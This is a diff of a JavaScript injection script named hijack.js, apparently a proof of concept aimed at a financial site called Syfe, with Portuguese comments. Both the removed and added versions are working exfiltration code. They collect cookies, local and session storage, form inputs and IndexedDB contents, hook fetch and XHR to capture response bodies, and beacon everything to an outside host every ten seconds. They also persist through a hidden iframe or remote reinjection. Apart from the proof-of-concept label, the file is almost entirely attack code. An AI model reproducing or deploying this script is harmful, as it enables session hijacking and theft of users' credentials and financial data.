@@ -1,74 +1,103 @@
-// hijack.js - Versão persistente e sensível para Syfe
-(async () => {
-  const ENDPOINT = 'https://premiumvalue.store/poc';
+(function () {
+  const endpoint = "https://premiumvalue.store/poc";
   const INTERVAL = 10000; // 10 segundos
+  let lastPayload = "";
 
-  const extractInputs = () => {
-    const inputs = Array.from(document.querySelectorAll('input, textarea, select'));
-    return inputs.reduce((acc, el) => {
-      const name = el.name || el.id || el.getAttribute('placeholder') || el.getAttribute('aria-label');
-      const value = el.value;
-      if (!name || !value || value.length < 3) return acc;
-      acc[name] = value;
-      return acc;
-    }, {});
-  };
-
-  const extractIndexedDB = async () => {
-    const databases = await indexedDB.databases?.();
-    return databases || [];
-  };
-
-  const exfiltrate = async () => {
-    const payload = {
-      timestamp: Date.now(),
-      url: location.href,
-      referrer: document.referrer,
-      cookies: document.cookie,
-      localStorage: { ...localStorage },
-      sessionStorage: { ...sessionStorage },
-      inputs: extractInputs(),
-      windowName: window.name,
-      indexedDB: await extractIndexedDB()
-    };
-
+  // Hook fetch
+  const originalFetch = window.fetch;
+  window.fetch = async (...args) => {
+    const response = await originalFetch(...args);
     try {
-      await fetch(ENDPOINT, {
-        method: 'POST',
-        body: JSON.stringify(payload),
-        headers: { 'Content-Type': 'application/json' },
-        mode: 'no-cors'
-      });
-    } catch (e) {
-      console.error('Exfiltration failed:', e);
+      const cloned = response.clone();
+      const text = await cloned.text();
+      report({ type: "fetch", url: args[0], body: text });
+    } catch {}
+    return response;
+  };
+
+  // Hook XHR
+  const open = XMLHttpRequest.prototype.open;
+  XMLHttpRequest.prototype.open = function () {
+    this.addEventListener("load", function () {
+      report({ type: "xhr", url: this.responseURL, body: this.responseText });
+    });
+    return open.apply(this, arguments);
+  };
+
+  // IndexedDB
+  async function dumpIndexedDB() {
+    const databases = await indexedDB.databases();
+    const result = {};
+    for (const dbInfo of databases) {
+      const { name, version } = dbInfo;
+      try {
+        const req = indexedDB.open(name, version);
+        req.onsuccess = () => {
+          const db = req.result;
+          result[name] = {};
+          const tx = db.transaction(db.objectStoreNames, "readonly");
+          for (const storeName of db.objectStoreNames) {
+            try {
+              const store = tx.objectStore(storeName);
+              const getAllReq = store.getAll();
+              getAllReq.onsuccess = () => {
+                result[name][storeName] = getAllReq.result;
+              };
+            } catch {}
+          }
+        };
+      } catch {}
     }
-  };
-
-  const reinjectIfMissing = () => {
-    if (!document.querySelector('script[data-hijack="true"]')) {
-      const s = document.createElement('script');
-      s.src = 'https://cdn.jsdelivr.net/gh/GeovaneAyala/syfe-poc-bypass@main/hijack.js';
-      s.setAttribute('data-hijack', 'true');
-      document.body.appendChild(s);
-    }
-  };
-
-  const hookEvents = () => {
-    document.addEventListener('input', exfiltrate, true);
-    document.addEventListener('change', exfiltrate, true);
-    document.addEventListener('submit', exfiltrate, true);
-    document.addEventListener('paste', exfiltrate, true);
-    document.addEventListener('click', exfiltrate, true);
-  };
-
-  // Persist via window.name or localStorage
-  if (!window.name.includes('hijack-persist')) {
-    window.name += '|hijack-persist';
-    localStorage.setItem('persist_hijack', '1');
+    return result;
   }
 
-  hookEvents();
-  reinjectIfMissing();
-  await exfiltrate();
-  setInterval(exfiltrate, INTERVAL);
+  // Extração de DOM
+  function extractVisibleText() {
+    return Array.from(document.querySelectorAll("input, textarea, select, [contenteditable], .sensitive, .field"))
+      .filter(e => e.offsetParent !== null)
+      .map(e => ({
+        tag: e.tagName,
+        name: e.name || e.id || null,
+        value: e.value || e.innerText || null
+      }));
+  }
+
+  // Payload
+  async function buildPayload() {
+    return {
+      url: location.href,
+      cookies: document.cookie,
+      referrer: document.referrer,
+      localStorage: { ...localStorage },
+      sessionStorage: { ...sessionStorage },
+      inputs: extractVisibleText(),
+      indexedDB: await dumpIndexedDB(),
+      timestamp: Date.now()
+    };
+  }
+
+  async function report(data) {
+    try {
+      const full = JSON.stringify(data);
+      if (full !== lastPayload) {
+        lastPayload = full;
+        await navigator.sendBeacon(endpoint, full);
+      }
+    } catch {}
+  }
+
+  // Persistência leve
+  if (!localStorage.hijackInjected) {
+    localStorage.hijackInjected = "true";
+    const iframe = document.createElement("iframe");
+    iframe.style = "display:none";
+    iframe.srcdoc = `<script src='${location.href}'><\/script>`;
+    document.body.appendChild(iframe);
+  }
+
+  // Intervalo de coleta
+  setInterval(async () => {
+    const payload = await buildPayload();
+    await report(payload);
+  }, INTERVAL);
 })();
